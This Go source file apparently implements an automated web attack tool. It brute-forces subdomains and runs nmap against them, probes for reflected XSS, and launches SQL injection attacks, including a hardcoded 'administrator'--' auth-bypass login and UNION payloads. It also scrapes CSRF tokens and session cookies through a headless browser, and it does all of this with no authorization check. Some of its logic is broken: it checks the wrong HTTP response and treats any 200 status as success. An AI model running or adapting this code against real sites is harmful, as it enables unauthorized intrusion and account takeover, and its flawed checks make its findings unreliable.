package pentestANDredteam

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

type AttackCredential struct {
	username string
	password string
}

type SessionInfo struct {
	csrfToken     string
	sessionCookie string
}

func TargetStatus(target string) bool {
	response, errorStatus := http.Get(target)

	if errorStatus != nil || response.StatusCode != http.StatusOK {
		return false
	}

	defer response.Body.Close()
	fmt.Println()
	fmt.Println("Target connected, start attacking...")
	return true
}

func ReadPayload(fname string) ([]string, error) {
	var payload []string
	file, erroropen := os.Open(fname)

	if erroropen != nil {
		return nil, erroropen
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		payload = append(payload, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return payload, nil
}

func FindCred(content context.Context, target string) bool {
	timeOut, cancel := context.WithTimeout(content, 10*time.Second)
	defer cancel()
	var htmlContent string
	//var username, session string

	err := chromedp.Run(timeOut,
		chromedp.Navigate("https://example.com/login"),
		chromedp.WaitVisible("body", chromedp.ByQuery),
		chromedp.OuterHTML("html", &htmlContent),
	)
	if err != nil {
		return false
	}
	return true
}

func Login(content context.Context, credentials AttackCredential, target string) error {
	timeOut, cancel := context.WithTimeout(content, 10*time.Second)
	defer cancel()

	err := chromedp.Run(timeOut,
		chromedp.Navigate(target),
		chromedp.SendKeys(`input[name="username"]`, credentials.username),
		chromedp.SendKeys(`input[name="password"]`, credentials.password),
		chromedp.Click(`button`),
	)
	if err != nil {
		return err
	}

	var loginSuccess bool
	var pageSource string
	err = chromedp.Run(timeOut, chromedp.OuterHTML("html", &pageSource))
	if err == nil {
		if strings.Contains(pageSource, "administrator") {
			loginSuccess = true
		}
	}
	fmt.Println(loginSuccess)

	return nil
}

func FindCSRFtoken(content context.Context) (string, error) {
	var csrfToken string

	runError := chromedp.Run(content,
		chromedp.ActionFunc(func(ctx context.Context) error {
			var parsing string
			fmt.Println("1")
			evaError := chromedp.Evaluate(`document.querySelector("input[name='csrf']").getAttribute("value")`, &parsing).Do(ctx)
			fmt.Println("2")
			if evaError != nil {
				fmt.Println("Evaluate Error:", evaError)

				return evaError
			}
			fmt.Println("3")
			fmt.Println("Parsing:", parsing) // Print the parsing result
			csrfToken = parsing
			fmt.Println("CSRF Token (inside Run):", csrfToken) // Print the csrfToken inside Run

			return nil
		}),
	)

	fmt.Println("CSRF Token:", csrfToken) // Print the csrfToken

	if runError != nil {
		return "", runError
	}

	return csrfToken, nil
}

func FindCookie(content context.Context) (string, error) {
	var cookies []*network.Cookie
	var collectedCookie []string
	var cookieString string

	err := chromedp.Run(content, chromedp.ActionFunc(func(content context.Context) error {
		var err error
		cookies, err = network.GetCookies().Do(content)
		return err
	}))

	for _, piece := range cookies {
		cookieString := piece.Name + piece.Value
		collectedCookie = append(collectedCookie, cookieString)
	}

	cookieString = strings.Join(collectedCookie, "")

	if err != nil {
		return "", err
	}

	return cookieString, nil
}

func GetSessionInfo(content context.Context) (*SessionInfo, error) {
	sessionInfo := SessionInfo{}

	sessionContent, cancel := context.WithTimeout(content, 10*time.Second)

	fmt.Println(sessionContent)

	runError := chromedp.Run(sessionContent, chromedp.ActionFunc(func(content context.Context) error {
		var sessionError error
		sessionInfo.csrfToken, sessionError = FindCSRFtoken(content)
		if sessionError != nil {
			return sessionError
		}

		sessionInfo.sessionCookie, sessionError = FindCookie(content)
		if sessionError != nil {
			return sessionError
		}

		return nil
	}))

	cancel()

	if runError != nil {
		// Check if the error is due to context cancellation
		if runError == context.Canceled {
			fmt.Println("Context canceled:", runError)
		}
		return nil, runError
	}
	return &sessionInfo, nil
}

func DomainPath(target string) (string, string) {
	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println()
		fmt.Println("üíÄ Error Extracting Domain name. ‚ùå")
		fmt.Println()
	}

	domain := parsedURL.Hostname()
	path := parsedURL.Path
	return domain, path
}

// nmap
func NmapExecution(target string) {
	nmapPath := "/usr/local/bin/nmap"
	passing := Scope{}
	fmt.Printf("Execute nmap -A to %s\n", target)
	args := []string{passing.Nmap.Command}

	cmd := exec.Command(nmapPath, args...)
	cmd.Args = append(cmd.Args, target)
	nmapOutput, err := cmd.Output()

	fmt.Scanln(passing.General.Plan)
	if passing.General.Plan == "A" {
		passing.Nmap.Command = "A"
	}

	if err != nil {
		fmt.Printf("Error executing nmap command: %s\n", err)
	}

	ascii := make([]string, len(nmapOutput))
	for i, value := range nmapOutput {
		ascii[i] = string(value)
	}

	taping := strings.Join(ascii, "")
	result := strings.Split(taping, " ")

	fmt.Println(result)
}

// Domain Enumeration
func SubdomainEnumeration(passing *Scope) {
	foundOrNot := false
	target := passing.HTTP.Domain
	ignoring := passing.General.Ignore

	if !TargetStatus(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/subdomain.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		Domain := "https://" + trial + "." + target
		if TargetStatus(Domain) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", Domain)
			NmapExecution(trial + "." + target)
		}
	}

	if !foundOrNot {
		fmt.Printf("üî∫ No Subdomain Found")
	} else {
		fmt.Println("üü¢ Subdomain Found")
	}
}

// Cross Site Script
func ReflectedXSS(target string, ignoring bool) string {
	foundOrNot := false

	if !TargetStatus(target) && !ignoring {
		return "Can not connect to the target."
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/xss.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatus(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	if foundOrNot {
		return "ü™≤ Found Reflected XSS bug"
	}
	return "‚ùå Reflected XSS bug not found"
}

func CrossSiteScript(passing *Scope) {
	stop := make(chan bool)
	reflected := make(chan string)

	fmt.Println("XSS Attack")
	fmt.Println("Start Reflected XSS Attack")

	go LoadingIcon(stop)
	go func() {
		reflected <- ReflectedXSS(passing.XSS.Target, passing.General.Ignore)
		stop <- true
	}()

	reflect := <-reflected

	fmt.Println(reflect)
}

// SQL Injection
func GenericSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println("Start Generic SQL Injection")

	if !TargetStatus(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/genericSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatus(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	if foundOrNot {
		return true
	}
	return false
}

func AuthBypassSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false
	var domainName string
	var pathName string
	response, errorStatus := http.Get(target)

	if errorStatus != nil || response.StatusCode != http.StatusOK {
		if !ignoring {
			fmt.Println("Can not connect to the target.")
			return false
		}
	}

	defer response.Body.Close()
	fmt.Println()
	fmt.Println("Target connected, start attacking...")
	fmt.Println("Start Auth Bypass SQL Injection")

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/authSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	credentials := AttackCredential{
		username: "administrator'--",
		password: "pword",
	}

	newContent := context.Background()
	content, cancel := chromedp.NewContext(newContent)
	defer cancel()

	fmt.Println(content.Deadline())

	loginError := Login(content, credentials, target)
	if loginError != nil {
		return false
	}

	sessionInfo, sessionError := GetSessionInfo(content)
	fmt.Println("session csrf:  ", sessionInfo.csrfToken, " session cookie:  ", sessionInfo.sessionCookie)
	if sessionError != nil {
		fmt.Println("Failed to get session information:", sessionError)

		return false
	}

	domainName, pathName = DomainPath(target)

	// start attack
	for _, trial := range payload {
		credentials := url.Values{
			"csrf":     {sessionInfo.csrfToken},
			"username": {trial},
			"password": {"password"},
		}
		rawRequest := fmt.Sprintf(`POST %s HTTP/2
			Host: %s
			Cookie: %s
			Content-Type: application/x-www-form-urlencoded
			Content-Length: %d
			%s`, pathName, domainName, sessionInfo.sessionCookie, len(credentials.Encode()), credentials.Encode())

		client := &http.Client{}

		postRequest, requestError := http.NewRequest("POST", target, strings.NewReader(rawRequest))
		if requestError != nil {
			log.Fatal(requestError)
		}

		postResponse, responseError := client.Do(postRequest)
		if responseError != nil {
			log.Fatal(responseError)
		}
		defer postResponse.Body.Close()

		if response.Status == "200 OK" {
			foundOrNot = true
			fmt.Println(trial)
		}

		fmt.Println("Response status:", response.Status)
	}

	if foundOrNot {
		return true
	}
	return false
}

func UnionSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println()
	fmt.Println("Start UNION SQL Injection")

	if !TargetStatus(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/unionSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatus(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	if foundOrNot {
		return true
	}
	return false
}

// find username and password first, retrive it from web page then login with admin username/password
func AdvanceUnionSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println()
	fmt.Println("Start Advanced UNION SQL Injection")

	if !TargetStatus(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/unionSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatus(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
			//content, cancel := chromedp.NewContext(context.Background())
			//defer cancel()
			/*
				loginError := FindCred(content, target)
				if loginError != nil {
					return false
				}
			*/
		}
	}

	if foundOrNot {
		return true
	}
	return false
}

func SQLInjection(passing *Scope) {
	stop := make(chan bool)
	//generic := make(chan bool)
	auth := make(chan bool)
	union := make(chan bool)
	advanceUnion := make(chan bool)

	fmt.Println("Start SQL Injection Attack")

	go LoadingIcon(stop)
	go func() {
		//generic <- GenericSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		auth <- AuthBypassSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		union <- UnionSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		advanceUnion <- AdvanceUnionSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		stop <- true
	}()

	//genericResult := <-generic
	authResult := <-auth
	unionResult := <-union
	advanceUnionResult := <-advanceUnion

	/*
		if genericResult {
			fmt.Println("ü™≤ Found Generic SQL Injection bug")
		} else {
			fmt.Println("‚ùå Generic SQL Injection bug not found")
		}
	*/

	if authResult {
		fmt.Println("ü™≤ Found Auth Bypass SQL Injection bug")
	} else {
		fmt.Println("‚ùå Auth Bypass SQL Injection bug not found")
	}

	if unionResult {
		fmt.Println("ü™≤ Found UNION SQL Injection bug")
	} else {
		fmt.Println("‚ùå UNION SQL Injection bug not found")
	}

	if advanceUnionResult {
		fmt.Println("ü™≤ Found Advanced UNION SQL Injection bug")
	} else {
		fmt.Println("‚ùå Advanced UNION SQL Injection bug not found")
	}
}
